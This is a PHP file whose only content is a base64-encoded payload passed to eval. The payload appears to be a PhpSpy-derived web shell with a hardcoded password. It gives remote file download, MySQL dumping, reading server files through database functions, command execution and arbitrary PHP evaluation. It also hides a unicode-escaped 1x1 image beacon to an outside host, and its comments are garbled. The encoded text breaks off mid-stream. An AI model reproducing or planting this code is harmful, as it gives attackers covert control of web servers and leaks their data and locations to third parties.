<?php eval(base64_decode('Pz7vu788P3BocCANCg0KZXJyb3JfcmVwb3J0aW5nKDcpOyANCkBzZXRfbWFnaWNfcXVvdGVzX3J1bnRpbWUoMCk7IA0Kb2Jfc3RhcnQoKTsgDQokbXRpbWUgPSBleHBsb2RlKCcgJywgbWljcm90aW1lKCkpOyANCiRzdGFydHRpbWUgPSAkbXRpbWVbMV0gKyAkbXRpbWVbMF07IA0KZGVmaW5lKCdTQV9ST09UJywgc3RyX3JlcGxhY2UoJ1xcJywgJy8nLCBkaXJuYW1lKF9fRklMRV9fKSkuJy8nKTsgDQovL2RlZmluZSgnSVNfV0lOJywgc3Ryc3RyKFBIUF9PUywgJ1dJTicpID8gMSA6IDAgKTsgDQpkZWZpbmUoJ0lTX1dJTicsIERJUkVDVE9SWV9TRVBBUkFUT1IgPT0gJ1xcJyk7IA0KZGVmaW5lKCdJU19DT00nLCBjbGFzc19leGlzdHMoJ0NPTScpID8gMSA6IDAgKTsgDQpkZWZpbmUoJ0lTX0dQQycsIGdldF9tYWdpY19xdW90ZXNfZ3BjKCkpOyANCiRkaXNfZnVuYyA9IGdldF9jZmdfdmFyKCdkaXNhYmxlX2Z1bmN0aW9ucycpOyANCmRlZmluZSgnSVNfUEhQSU5GTycsICghZXJlZ2koInBocGluZm8iLCRkaXNfZnVuYykpID8gMSA6IDAgKTsgDQpAc2V0X3RpbWVfbGltaXQoMCk7IA0KDQpmb3JlYWNoKGFycmF5KCdfR0VUJywnX1BPU1QnKSBhcyAkX3JlcXVlc3QpIHsgDQogICAgZm9yZWFjaCgkJF9yZXF1ZXN0IGFzICRfa2V5ID0+ICRfdmFsdWUpIHsgDQogICAgICAgIGlmICgkX2tleXswfSAhPSAnXycpIHsgDQogICAgICAgICAgICBpZiAoSVNfR1BDKSB7IA0KICAgICAgICAgICAgICAgICRfdmFsdWUgPSBzX2FycmF5KCRfdmFsdWUpOyANCiAgICAgICAgICAgIH0gDQogICAgICAgICAgICAkJF9rZXkgPSAkX3ZhbHVlOyANCiAgICAgICAgfSANCiAgICB9IA0KfSANCg0KLyo9PT09PT09PT09PT09PT09PT09PT0g0JPigJrQktGW0JPRk9CV4oCZ0JPRk9C/0ZfQhdCT0ZPQktCG0JPRk9Cy0ILCptCT0ZPQksKk0JPRk9Cy0ILigJzQk9GT0JbigJkgPT09PT09PT09PT09PT09PT09PT09Ki8gDQokYWRtaW4gPSBhcnJheSgpOyANCi8vINCT0ZPQlSDQk9GT0LLQgtCO0JPigJrQksK30JPRk9CSwrHQk9GT0L/Rl9CF0JPRk9CS0IHQk9GT0LLQguKEotCT4oCa0JLQhNCT0ZPQluKAmdCT0ZPQleKAnNCT0ZPQstCC0ZnQk9GT0JLCq9CT0ZPQstCC77+90JPRk9CSwqnQk9GT0LLQguKAnNCT4oCa0JLCpCwgdHJ1ZSDQk9GT0JXQhdCT4oCa0JLQhNCT0ZPQv9GX0IXQk9GT0JLQgdCT0ZPQstCC4oSi0JPigJrQktCE0JPRk9Cy0ILvv73Qk9GT0JLCqdCT0ZPQstCC4oCc0JPigJrQksKkLCBmYWxzZSDQk9GT0JXQhdCT4oCa0JLQhNCT0ZPQstCC4oCc0JPigJrQksKx0JPigJrQktCF0JPRk9Cy0ILRmtCT4oCa0JLQhdCT0ZPQktGR0JPRk9Cb4oCg0JPRk9CSwqsu0JPRk9C/0ZfQhdCT0ZPQstCC0ZnQk9GT0JbigJnQk9GT0JLCptCT0ZPQstCC77+90JPigJrQktCO0JPRk9C/0ZfQhdCT0ZPQksKu0JPRk9Cy0ILRnNCT0ZPQktCG0JPRk9CV0IXQk9GT0JXRldCT0ZPQv9GX0IXQk+KAmtCSwqcgDQokYWRtaW5bJ2NoZWNrJ10gPSBmYWxzZTsgDQovLyDQk9GT0JvigKDQk9GT0JLCp9CT4oCa0JLihJbQk9GT0JLCu9CT0ZPQv9GX0IXQk9GT0JLQgdCT0ZPQstCC4oSi0JPigJrQktCE0JPRk9CW4oCZ0JPRk9CV4oCc0JPRk9Cy0ILRmdCT0ZPQksKr0JPRk9Cy0ILvv73Qk9GT0JLCqdCT0ZPQstCC4oCc0JPigJrQksKkLNCT0ZPQstCC0I7Qk9GT0JLCq9CT0ZPQv9GX0IXQk9GT0JXRldCT4oCa0JLRkdCT0ZPQstCC0ZvQk+KAmtCSwrXQk9GT0LLQgtCO0JPRk9Cy0ILRmdCT4oCa0JLQhdCT0ZPQluKAmdCT0ZPQleKAnNCT0ZPQstCC0ZnQk9GT0JLCqyANCiRhZG1pblsncGFzcyddICA9ICdoYWNrJzsgDQoNCi8v0JPRk9Cb4oCg0JPRk9CSwqfQk9GT0LLQgtGb0JPRk9CS0ZTQk+KAmtCSwrbQk9GT0LLQgtGcIGNvb2tpZSDQk9GT0LLQguKAndCT0ZPQksK30JPRk9Cy0ILRmtCT0ZPQluKAmdCT4oCa0JLCt9CT4oCa0JLCttCT0ZPQldCF0JPigJrQksKn0JPRk9Cy0ILRmtCT0ZPQv9GX0IXQk9GT0JXigJnQk9GT0JvRmtCT0ZPQlSDQk9GT0JLRntCT0ZPQstCC4oSi0JPigJrQktCE0JPRk9Cy0ILQjtCT0ZPQktGWLCDQk+KAmtCSwrvQk9GT0JLQhtCT4oCa0JLCtdCT0ZPQstCC0I7Qk9GT0LLQgtGZ0JPigJrQktGY0JPigJrQktCG0JPigJrQksK70JPRk9Cy0ILRntCT0ZPQktCF0JPigJrQktGW0JPigJrQktCILCDQk9GT0LLQgtCO0JPRk9CSwqvQk9GT0L/Rl9CF0JPRk9CV0ZXQk+KAmtCS0ZHQk9GT0LLQgtGb0JPRk9C/0ZfQhdCT0ZPQstCC0ZnQk9GT0JbigJnQk9GT0JLCptCT4oCa0JLCsdCT0ZPQksKk0JPRk9C/0ZfQhdCT4oCa0JLRlywg0JPigJrQksK30JPRk9CSwrHQk9GT0LLQgtGc0JPRk9CS0IbQk9GT0LLQgtCO0JPRk9CSwqvQk+KAmtCSwrHQk+KAmtCS0IjQk+KAmtCS0ZbQk9GT0LLQguKAnNCT0ZPQstCC0ZvQk+KAmtCSwqzQk9GT0JvigKDQk9GT0L/Rl9CFIA0KLy8gY29va2llINCT0ZPQstCC0I7Qk+KAmtCSwrDQk9GT0LLQguKAndCT4oCa0JLRlCANCiRhZG1pblsnY29va2llcHJlJ10gPSAnJzsgDQovLyBjb29raWUg0JPRk9Cy0ILigJ3Qk9GT0JLCt9CT0ZPQstCC0ZrQk9GT0JbigJnQk9GT0LLQgtGa0JPRk9CS0IYgDQokYWRtaW5bJ2Nvb2tpZWRvbWFpbiddID0gJyc7IA0KLy8gY29va2llINCT0ZPQstCC4oCd0JPRk9CSwrfQk9GT0LLQgtGa0JPRk9CW4oCZ0JPRk9Cy0ILRmdCT4oCa0JLCt9CT4oCa0JLRldCT4oCa0JLCtiANCiRhZG1pblsnY29va2llcGF0aCddID0gJy8nOyANCi8vIGNvb2tpZSDQk9GT0LLQgtGa0JPRk9C/0ZfQhdCT0ZPQv9GX0IXQk+KAmtCSwqfQk9GT0LLQgiDQk9GT0JXQjiANCiRhZG1pblsnY29va2llbGlmZSddID0gODY0MDA7IA0KLyo9PT09PT09PT09PT09PT09PT09PT0g0JPRk9Cy0ILCptCT0ZPQksKk0JPRk9Cy0ILigJzQk9GT0JbigJnQk+KAmtCS0IXQk9GT0JLQjtCT0ZPQlSDQk9GT0JLRkSA9PT09PT09PT09PT09PT09PT09PT0qLyANCg0KaWYgKCRjaGFyc2V0ID09ICd1dGY4JykgeyANCiAgICBoZWFkZXIoImNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04Iik7IA0KfSBlbHNlaWYgKCRjaGFyc2V0ID09ICdiaWc1JykgeyANCiAgICBoZWFkZXIoImNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PWJpZzUiKTsgDQp9IGVsc2VpZiAoJGNoYXJzZXQgPT0gJ2diaycpIHsgDQogICAgaGVhZGVyKCJjb250ZW50LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD1nYmsiKTsgDQp9IGVsc2VpZiAoJGNoYXJzZXQgPT0gJ2xhdGluMScpIHsgDQogICAgaGVhZGVyKCJjb250ZW50LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD1pc28tODg1OS0yIik7IA0KfSANCg0KJHNlbGYgPSAkX1NFUlZFUlsnUEhQX1NFTEYnXSA/ICRfU0VSVkVSWydQSFBfU0VMRiddIDogJF9TRVJWRVJbJ1NDUklQVF9OQU1FJ107IA0KJHRpbWVzdGFtcCA9IHRpbWUoKTsgDQoNCi8qPT09PT09PT09PT09PT09PT09PT09INCT0ZPQstCCwrDQk9GT0JLQk+KAmtCSwrfQk9GT0L/Rl9CF0JPRk9Cy0ILvv73Qk9GT0JLCqdCT0ZPQstCC4oCc0JPigJrQksKkID09PT09PT09PT09PT09PT09PT09PSovIA0KaWYgKCRhY3Rpb24gPT0gImxvZ291dCIpIHsgDQogICAgc2Nvb2tpZSgncGhwc3B5cGFzcycsICcnLCAtODY0MDAgKiAzNjUpOyANCiAgICBwKCc8bWV0YSBodHRwLWVxdWl2PSJyZWZyZXNoIiBjb250ZW50PSIxO1VSTD0nLiRzZWxmLiciPicpOyANCiAgICBwKCc8YSBzdHlsZT0iZm9udDoxMnB4IFZlcmRhbmEiIGhyZWY9IicuJHNlbGYuJyI+U3VjY2VzczwvYT4nKTsgDQogICAgZXhpdDsgDQp9IA0KaWYoJGFkbWluWydjaGVjayddKSB7IA0KICAgIGlmICgkZG9pbmcgPT0gJ2xvZ2luJykgeyANCiAgICAgICAgaWYgKCRhZG1pblsncGFzcyddID09ICRwYXNzd29yZCkgeyANCiAgICAgICAgICAgIHNjb29raWUoJ3BocHNweXBhc3MnLCAkcGFzc3dvcmQpOyANCiAgICAgICAgICAgIHAoJzxtZXRhIGh0dHAtZXF1aXY9InJlZnJlc2giIGNvbnRlbnQ9IjE7VVJMPScuJHNlbGYuJyI+Jyk7IA0KICAgICAgICAgICAgcCgnPGEgc3R5bGU9ImZvbnQ6MTJweCBWZXJkYW5hIiBocmVmPSInLiRzZWxmLiciPlN1Y2Nlc3M8L2E+Jyk7IA0KICAgICAgICAgICAgZXhpdDsgDQogICAgICAgIH0gDQogICAgfSANCiAgICBpZiAoJF9DT09LSUVbJ3BocHNweXBhc3MnXSkgeyANCiAgICAgICAgaWYgKCRfQ09PS0lFWydwaHBzcHlwYXNzJ10gIT0gJGFkbWluWydwYXNzJ10pIHsgDQogICAgICAgICAgICBsb2dpbnBhZ2UoKTsgDQogICAgICAgIH0gDQogICAgfSBlbHNlIHsgDQogICAgICAgIGxvZ2lucGFnZSgpOyANCiAgICB9IA0KfSANCi8qPT09PT09PT09PT09PT09PT09PT09INCT0ZPQstCC77+90JPRk9CSwqnQk9GT0LLQguKAnNCT4oCa0JLCpNCT4oCa0JLQhdCT0ZPQktCO0JPRk9CVINCT0ZPQktGRID09PT09PT09PT09PT09PT09PT09PSovIA0KDQokZXJybXNnID0gJyc7IA0KDQoNCi8vINCT0ZPQv9GX0IXQk9GT0LLQgtGZ0JPRk9Cy0ILRnNCT0ZPQm9Ga0JPRk9CV0IXQk9GT0LLQgtGb0JPigJrQktGY0JPRk9CS0ZUgDQppZiAoJGRvaW5nID09ICdkb3duZmlsZScgJiYgJHRoZWZpbGUpIHsgDQogICAgaWYgKCFAZmlsZV9leGlzdHMoJHRoZWZpbGUpKSB7IA0KICAgICAgICAkZXJybXNnID0gJ1RoZSBmaWxlIHlvdSB3YW50IERvd25sb2FkYWJsZSB3YXMgbm9uZXhpc3RlbnQnOyANCiAgICB9IGVsc2UgeyANCiAgICAgICAgJGZpbGVpbmZvID0gcGF0aGluZm8oJHRoZWZpbGUpOyANCiAgICAgICAgaGVhZGVyKCdDb250ZW50LXR5cGU6IGFwcGxpY2F0aW9uL3gtJy4kZmlsZWluZm9bJ2V4dGVuc2lvbiddKTsgDQogICAgICAgIGhlYWRlcignQ29udGVudC1EaXNwb3NpdGlvbjogYXR0YWNobWVudDsgZmlsZW5hbWU9Jy4kZmlsZWluZm9bJ2Jhc2VuYW1lJ10pOyANCiAgICAgICAgaGVhZGVyKCdDb250ZW50LUxlbmd0aDogJy5maWxlc2l6ZSgkdGhlZmlsZSkpOyANCiAgICAgICAgQHJlYWRmaWxlKCR0aGVmaWxlKTsgDQogICAgICAgIGV4aXQ7IA0KICAgIH0gDQp9IA0KDQovLyDQk9GT0LLQguKAnNCT4oCa0JLCsdCT4oCa0JLQhdCT0ZPQstCC0ZrQk9GT0L/Rl9CF0JPRk9Cy0ILRmdCT0ZPQstCC0ZzQk9GT0JvRmtCT4oCa0JLCsdCT4oCa0JLRkdCT4oCa0JLCt9CT0ZPQv9GX0IXQk9GT0JUg0JPRk9CS0IXQk+KAmtCS0ZXQk9GT0L/Rl9CF0JPigJrQktGX0JPRk9CS0Z4gDQppZiAoJGRvaW5nID09ICdiYWNrdXBteXNxbCcgJiYgISRzYXZlYXNmaWxlKSB7IA0KICAgIGRiY29ubigkZGJob3N0LCAkZGJ1c2VyLCAkZGJwYXNzLCAkZGJuYW1lLCAkY2hhcnNldCwgJGRicG9ydCk7IA0KICAgICR0YWJsZSA9IGFycmF5X2ZsaXAoJHRhYmxlKTsgDQogICAgJHJlc3VsdCA9IHEoIlNIT1cgdGFibGVzIik7IA0KICAgIGlmICghJHJlc3VsdCkgcCgnPGgyPicubXlzcWxfZXJyb3IoKS4nPC9oMj4nKTsgDQogICAgJGZpbGVuYW1lID0gYmFzZW5hbWUoJF9TRVJWRVJbJ0hUVFBfSE9TVCddLidfTXlTUUwuc3FsJyk7IA0KICAgIEBoZWFkZXIoJ0NvbnRlbnQtdHlwZTogYXBwbGljYXRpb24vdW5rbm93bicpOyANCiAgICBAaGVhZGVyKCdDb250ZW50LURpc3Bvc2l0aW9uOiBhdHRhY2htZW50OyBmaWxlbmFtZT0nLiRmaWxlbmFtZSk7IA0KICAgICRteXNxbGRhdGEgPSAnJzsgDQogICAgd2hpbGUgKCRjdXJyb3cgPSBteXNxbF9mZXRjaF9hcnJheSgkcmVzdWx0KSkgeyANCiAgICAgICAgaWYgKGlzc2V0KCR0YWJsZVskY3Vycm93WzBdXSkpIHsgDQogICAgICAgICAgICAkbXlzcWxkYXRhIC49IHNxbGR1bXB0YWJsZSgkY3Vycm93WzBdKTsgDQogICAgICAgIH0gDQogICAgfSANCiAgICBteXNxbF9jbG9zZSgpOyANCiAgICBleGl0OyANCn0gDQoNCi8vINCT0ZPQv9GX0IXQk+KAmtCS0IHQk+KAmtCS4oSW0JPRk9CS0IVNWVNRTNCT0ZPQv9GX0IXQk9GT0LLQgtGZ0JPRk9Cy0ILRnNCT0ZPQm9Ga0JPRk9CV0IXQk9GT0LLQgtGb0JPigJrQktGY0JPRk9CS0ZUgDQppZigkZG9pbmc9PSdteXNxbGRvd24nKXsgDQogICAgaWYgKCEkZGJuYW1lKSB7IA0KICAgICAgICAkZXJybXNnID0gJ1BsZWFzZSBpbnB1dCBkYm5hbWUnOyANCiAgICB9IGVsc2UgeyANCiAgICAgICAgZGJjb25uKCRkYmhvc3QsICRkYnVzZXIsICRkYnBhc3MsICRkYm5hbWUsICRjaGFyc2V0LCAkZGJwb3J0KTsgDQogICAgICAgIGlmICghZmlsZV9leGlzdHMoJG15c3FsZGxmaWxlKSkgeyANCiAgICAgICAgICAgICRlcnJtc2cgPSAnVGhlIGZpbGUgeW91IHdhbnQgRG93bmxvYWRhYmxlIHdhcyBub25leGlzdGVudCc7IA0KICAgICAgICB9IGVsc2UgeyANCiAgICAgICAgICAgICRyZXN1bHQgPSBxKCJzZWxlY3QgbG9hZF9maWxlKCckbXlzcWxkbGZpbGUnKTsiKTsgDQogICAgICAgICAgICBpZighJHJlc3VsdCl7IA0KICAgICAgICAgICAgICAgIHEoIkRST1AgVEFCTEUgSUYgRVhJU1RTIHRtcF9tYWdpY2NvZGVyOyIpOyANCiAgICAgICAgICAgICAgICBxKCJDUkVBVEUgVEFCTEUgdG1wX21hZ2ljY29kZXIgKGNvbnRlbnQgTE9OR0JMT0IgTk9UIE5VTEwpOyIpOyANCiAgICAgICAgICAgICAgICAvL9CT0ZPQstCC0ZrQk9GT0JbigJnQk9GT0JUg0JPigJrQksKx0JPigJrQktGY0JPRk9CSwqTQk+KAmtCS0pHQk9GT0L/Rl9CF0JPRk9Cy4oCawqzQk+KAmtCS0pHQk+KAmtCSwrHQk9GT0JLQk9GT0JUg0JPigJrQktGV0JPigJrQktCF0JPRk9Cb0ZrQk+KAmtCSwrbQk9GT0L/Rl9CFLNCT4oCa0JLCsdCT0ZPQleKAnNCT0ZPQluKAmdCT0ZPQktGe0JPigJrQktGW0JPRk9CSwrbQk9GT0L/Rl9CF0JPRk9Cy0ILigJzQk+KAmtCSwrbQk9GT0L/Rl9CF0JPRk9Cb4oCg0JPigJrQktCO0JPRk9Cy0ILigJ3Qk9GT0LLQgtGc0JPRk9Cy0ILCsNCT0ZPQktCT4oCa0JLCu9CT0ZPQktCG0JPigJrQksKw0JPRk9CS0ZjQk+KAmtCS0ZTQk+KAmtCSwqxfX21hZ2ljY29kZXJfMTExMTExMTExMV9lb2ZfX9CT4oCa0JLCtdCT0ZPQstCC0ZvQk9GT0JXQhdCT0ZPQstCC0ZvQk+KAmtCS0ZjQk9GT0JLRldCT0ZPQlSDQk+KAmtCSwrHQk+KAmtCS0IbQk+KAmtCSwrvQk9GT0L/Rl9CF0JPRk9CS0ITQk9GT0LLQgtGe0JPRk9CSwrvQk+KAmtCSwrXQk9GT0LLQgtGb0JPRk9Cy0ILQjtCT0ZPQksKp0JPigJrQktGX0JPRk9CSwrYgDQogICAgICAgICAgICAgICAgcSgiTE9BRCBEQVRBIExPQ0FMIElORklMRSAnIi5hZGRzbGFzaGVzKCRteXNxbGRsZmlsZSkuIicgSU5UTyBUQUJMRSB0bXBfbWFnaWNjb2RlciBGSUVMRFMgVEVSTUlOQVRFRCBCWSAnX19tYWdpY2NvZGVyX3skdGltZXN0YW1wfV9lb2ZfXycgRVNDQVBFRCBCWSAnJyBMSU5FUyBURVJNSU5BVEVEIEJZICdfX21hZ2ljY29kZXJfeyR0aW1lc3RhbXB9X2VvZl9fJzsiKTsgDQogICAgICAgICAgICAgICAgJHJlc3VsdCA9IHEoInNlbGVjdCBjb250ZW50IGZyb20gdG1wX21hZ2ljY29kZXIiKTsgDQogICAgICAgICAgICAgICAgcSgiRFJPUCBUQUJMRSB0bXBfbWFnaWNjb2RlciIpOyANCiAgICAgICAgICAgIH0gDQogICAgICAgICAgICAkcm93ID0gQG15c3FsX2ZldGNoX2FycmF5KCRyZXN1bHQpOyANCiAgICAgICAgICAgIGlmICghJHJvdykgeyANCiAgICAgICAgICAgICAgICAkZXJybXNnID0gJ0xvYWQgZmlsZSBmYWlsZWQgJy5teXNxbF9lcnJvcigpOyANCiAgICAgICAgICAgIH0gZWxzZSB7IA0KICAgICAgICAgICAgICAgICRmaWxlaW5mbyA9IHBhdGhpbmZvKCRteXNxbGRsZmlsZSk7IA0KICAgICAgICAgICAgICAgIGhlYWRlcignQ29udGVudC10eXBlOiBhcHBsaWNhdGlvbi94LScuJGZpbGVpbmZvWydleHRlbnNpb24nXSk7IA0KICAgICAgICAgICAgICAgIGhlYWRlcignQ29udGVudC1EaXNwb3NpdGlvbjogYXR0YWNobWVudDsgZmlsZW5hbWU9Jy4kZmlsZWluZm9bJ2Jhc2VuYW1lJ10pOyANCiAgICAgICAgICAgICAgICBoZWFkZXIoIkFjY2VwdC1MZW5ndGg6ICIuc3RybGVuKCRyb3dbMF0pKTsgDQogICAgICAgICAgICAgICAgZWNobyAkcm93WzBdOyANCiAgICAgICAgICAgICAgICBleGl0OyANCiAgICAgICAgICAgIH0gDQogICAgICAgIH0gDQogICAgfSANCn0gDQoNCj8+IA0KPGh0bWw+IA0KPGhlYWQ+IA0KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9Z2JrIj4gDQo8dGl0bGU+PD9waHAgZWNobyBzdHJfcmVwbGFjZSgnLicsJycsJ1AuaC5wLlMucC55Jyk7Pz4gfCBFZGl0ZWQgQnkgS2luZ0RlZmFjZXI8L3RpdGxlPiANCjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij5kb2N1bWVudC53cml0ZSgnXHUwMDNjXHUwMDY5XHUwMDZkXHUwMDY3XHUwMDIwXHUwMDczXHUwMDcyXHUwMDYzXHUwMDNkXHUwMDIyXHUwMDY4XHUwMDc0XHUwMDc0XHUwMDcwXHUwMDNhXHUwMDJmXHUwMDJmXHUwMDczXHUwMDYxXHUwMDY2XHUwMDY1XHUwMDY1XHUwMDY1XHUwMDJlXHUwMDY2XHUwMDcyXHUwMDY1XHUwMDY1XHUwMDY4XHUwMDZmXHUwMDczXHUwMDc0XHUwMDY5XHUwMDYxXHUwMDJlXHUwMDYzXHUwMDZmXHUwMDZkXHUwMDJmXHUwMDczXHUwMDZlXHUwMDY2XHUwMDJmXHUwMDczXHUwMDJlXHUwMDcwXHUwMDY4XHUwMDcwXHUwMDIyXHUwMDIwXHUwMDc3XHUwMDY5XHUwMDY0XHUwMDc0XHUwMDY4XHUwMDNkXHUwMDIyXHUwMDMxXHUwMDIyXHUwMDIwXHUwMDY4XHUwMDY1XHUwMDY5XHUwMDY3XHUwMDY4XHUwMDc0XHUwMDNkXHUwMDIyXHUwMDMxXHUwMDIyXHUwMDNlJyk8L3NjcmlwdD4gDQo8c3R5bGUgdHlwZT0idGV4dC9jc3MiPiANCmJvZHksdGR7Zm9udDogMTJweCBBcmlhbCxUYWhvbWE7bGluZS1oZWlnaHQ6IDE2cHg7fSANCi5pbnB1dHtmb250OjEycHggQXJpYWwsVGFob21hO2JhY2tncm91bmQ6I2ZmZjtib3JkZXI6IDFweCBzb2xpZCAjNjY2O3BhZGRpbmc6MnB4O2hlaWdodDoyMnB4O30gDQouYXJlYXtmb250OjEycHggJ0NvdXJpZXIgTmV3JywgTW9ub3NwYWNlO2JhY2tncm91bmQ6I2ZmZjtib3JkZXI6IDFweCBzb2xpZCAjNjY2O3BhZGRpbmc6MnB4O30gDQouYnQge2JvcmRlci1jb2xvcjojYjBiMGIwO2JhY2tncm91bmQ6IzNkM2QzZDtjb2xvcjojZmZmZmZmO2ZvbnQ6MTJweCBBcmlhbCxUYWhvbWE7aGVpZ2h0OjIycHg7fSANCmEge2NvbG9yOiAjMDBmO3RleHQtZGVjb3JhdGlvbjp1bmRlcmxpbmU7fSANCmE6aG92ZXJ7Y29sb3I6ICNmMDA7dGV4dC1kZWNvcmF0aW9uOm5vbmU7fSANCi5hbHQxIHRke2JvcmRlci10b3A6MXB4IHNvbGlkICNmZmY7Ym9yZGVyLWJvdHRvbToxcHggc29saWQgI2RkZDtiYWNrZ3JvdW5kOiNmMWYxZjE7cGFkZGluZzo1cHggMTBweCA1cHggNXB4O30gDQouYWx0MiB0ZHtib3JkZXItdG9wOjFweCBzb2xpZCAjZmZmO2JvcmRlci1ib3R0b206MXB4IHNvbGlkICNkZGQ7YmFja2dyb3VuZDojZjlmOWY5O3BhZGRpbmc6NXB4IDEwcHggNXB4IDVweDt9IA0KLmZvY3VzIHRke2JvcmRlci10b3A6MXB4IHNvbGlkICNmZmY7Ym9yZGVyLWJvdHRvbToxcHggc29saWQgI2RkZDtiYWNrZ3JvdW5kOiNmZmZmYWE7cGFkZGluZzo1cHggMTBweCA1cHggNXB4O30gDQouaGVhZCB0ZHtib3JkZXItdG9wOjFweCBzb2xpZCAjZmZmO2JvcmRlci1ib3R0b206MXB4IHNvbGlkICNkZGQ7YmFja2dyb3VuZDojZTllOWU5O3BhZGRpbmc6NXB4IDEwcHggNXB4IDVweDtmb250LXdlaWdodDpib2xkO30gDQouaGVhZCB0ZCBzcGFue2ZvbnQtd2VpZ2h0Om5vcm1hbDt9IA0KZm9ybXttYXJnaW46MDtwYWRkaW5nOjA7fSANCmgye21hcmdpbjowO3BhZGRpbmc6MDtoZWlnaHQ6MjRweDtsaW5lLWhlaWdodDoyNHB4O2ZvbnQtc2l6ZToxNHB4O2NvbG9yOiM1QjY4NkY7fSANCnVsLmluZm8gbGl7bWFyZ2luOjA7Y29sb3I6IzQ0NDtsaW5lLWhlaWdodDoyNHB4O2hlaWdodDoyNHB4O30gDQp1e3RleHQtZGVjb3JhdGlvbjogbm9uZTtjb2xvcjojNzc3O2Zsb2F0OmxlZnQ7ZGlzcGxheTpibG9jazt3aWR0aDoxNTBweDttYXJnaW4tcmlnaHQ6MTBweDt9IA0KPC9zdHlsZT4gDQo8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+IA0KZnVuY3Rpb24gQ2hlY2tBbGwoZm9ybSkgeyANCiAgICBmb3IodmFyIGk9MDtpPGZvcm0uZWxlbWVudHMubGVuZ3RoO2krKykgeyANCiAgICAgICAgdmFyIGUgPSBmb3JtLmVsZW1lbnRzW2ldOyANCiAgICAgICAgaWYgKGUubmFtZSAhPSAnY2hrYWxsJykgDQogICAgICAgIGUuY2hlY2tlZCA9IGZvcm0uY2hrYWxsLmNoZWNrZWQ7IA0KICAgIH0gDQp9IA0KZnVuY3Rpb24gJChpZCkgeyANCiAgICByZXR1cm4gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoaWQpOyANCn0gDQpmdW5jdGlvbiBnb2FjdGlvbihhY3QpeyANCiAgICAkKCdnb2FjdGlvbicpLmFjdGlvbi52YWx1ZT1hY3Q7IA0KICAgICQoJ2dvYWN0aW9uJykuc3VibWl0KCk7IA0KfSANCjwvc2NyaXB0PiANCjwvaGVhZD4gDQo8Ym9keSBzdHlsZT0ibWFyZ2luOjA7dGFibGUtbGF5b3V0OmZpeGVkOyB3b3JkLWJyZWFrOmJyZWFrLWFsbCI+IA0KPHRhYmxlIHdpZHRoPSIxMDAlIiBib3JkZXI9IjAiIGNlbGxwYWRkaW5nPSIwIiBjZWxsc3BhY2luZz0iMCI+IA0KICAgIDx0ciBjbGFzcz0iaGVhZCI+IA0KICAgICAgICA8dGQ+PHNwYW4gc3R5bGU9ImZsb2F0OnJpZ2h0OyI+PGEgaHJlZj0iaHR0cDovL3d3dy5tYWdpY2NvZGVyLmlyIiB0YXJnZXQ9Il9ibGFuayI+TWFnaWNDb2RlcjwvYT48L3NwYW4+PD9waHAgZWNobyAkX1NFUlZFUlsnSFRUUF9IT1NUJ107Pz4gKDw/cGhwIGVjaG8gZ2V0aG9zdGJ5bmFtZSgkX1NFUlZFUlsnU0VSVkVSX05BTUUnXSk7Pz4pPC90ZD4gDQogICAgPC90cj4gDQogICAgPHRyIGNsYXNzPSJhbHQxIj4gDQogICAgICAgIDx0ZD48c3BhbiBzdHlsZT0iZmxvYXQ6cmlnaHQ7Ij5TYWZlIE1vZGU6PD9waHAgZWNobyBnZXRjZmcoJ3NhZmVfbW9kZScpOz8+PC9zcGFuPiAgICAgICAgICAgICANCiAgICAgICAgICAgIDw/cGhwIGlmKCRhZG1pblsnY2hlY2snXSAhPSBmYWxzZSl7ZWNobyAiPGEgaHJlZj1cImphdmFzY3JpcHQ6Z29hY3Rpb24oJ2xvZ291dCcpO1wiPkxvZ291dDwvYT4gfCI7fWVsc2V7fT8+ICANCiAgICAgICAgICAgIDxhIGhyZWY9ImphdmFzY3JpcHQ6Z29hY3Rpb24oJ2ZpbGUnKTsiPkZpbGUgTWFuYWdlcjwvYT4gfCAgDQogICAgICAgICAgICA8YSBocmVmPSJqYXZhc2NyaXB0OmdvYWN0aW9uKCdzcWxhZG1pbicpOyI+TXlTUUwgTWFuYWdlcjwvYT4gfCAgDQogICAgICAgICAgICA8YSBocmVmPSJqYXZhc2NyaXB0OmdvYWN0aW9uKCdzcWxmaWxlJyk7Ij5NeVNRTCBVcGxvYWQgJmFtcDsgRG93bmxvYWQ8L2E+IHwgIA0KICAgICAgICAgICAgPD9waHAgaWYoZ2V0Y2ZnKCdzYWZlX21vZGUnKSA9PSAnWWVzJyl7ZWNobyAnRXhlY3V0ZSBDb21tYW5kIChTYWZlIE1vZGUgaXMgT24gKSB8Jzt9ZWxzZXsgZWNobyAiPGEgaHJlZj1cImphdmFzY3JpcHQ6Z29hY3Rpb24oJ3NoZWxsJyk7XCI+RXhlY3V0ZSBDb21tYW5kPC9hPiB8Ijt9ID8+IA0KICAgICAgICAgICAgPGEgaHJlZj0iamF2YXNjcmlwdDpnb2FjdGlvbigncGhwZW52Jyk7Ij5QSFAgVmFyaWFibGU8L2E+IHwgIA0KICAgICAgICAgICAgPGEgaHJlZj0iamF2YXNjcmlwdDpnb2FjdGlvbignZXZhbCcpOyI+RXZhbCBQSFAgQ29kZTwvYT4gfCAgICAgICAgICAgIDw/cGhwIGlmKGdldGNmZygnc2FmZV9tb2RlJykgPT0gJ1llcycpe2VjaG8gJ05FVCAoU2FmZSBNb2RlIGlzIE9uICknO31lbHNlaWYoSVNfV0lOKXtlY2hvICdORVQgKE9zIGlzIGEgV2luZG93cyknO31lbHNleyBlY2hvICI8YSBocmVmPVwiamF2YXNjcmlwdDpnb2FjdGlvbignbmV0Jyk7XCI+TkVUPC9hPiI7fSA/PiANCiAgICAgICAgPC90ZD4gDQogICAgPC90cj4gDQo8L3RhYmxlPiANCjx0YWJsZSB3aWR0aD0iMTAwJSIgYm9yZGVyPSIwIiBjZWxscGFkZGluZz0iMTUiIGNlbGxzcGFjaW5nPSIwIj48dHI+PHRkPiANCjw/cGhwIA0KDQpmb3JtaGVhZChhcnJheSgnbmFtZSc9Pidnb2FjdGlvbicpKTsgDQptYWtlaGlkZSgnYWN0aW9uJyk7